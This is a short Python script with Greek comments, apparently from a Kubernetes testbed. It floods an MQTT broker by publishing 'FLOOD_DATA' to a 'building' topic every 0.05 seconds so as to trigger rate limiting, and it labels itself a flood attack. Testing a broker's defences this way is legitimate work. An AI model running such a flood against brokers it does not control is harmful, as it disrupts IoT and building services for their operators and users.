import paho.mqtt.client as mqtt
import time
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()

print("[!] Starting Flood Attack...")
try:
    while True:
        # Στέλνουμε χωρίς ασταμάτητα
        client.publish("building", "FLOOD_DATA", qos=0)
        # Πολύ μικρό delay για να μην κρασάρει το script, αλλά να πιάνει το rate limit
        time.sleep(0.05)
except KeyboardInterrupt:
    client.disconnect()
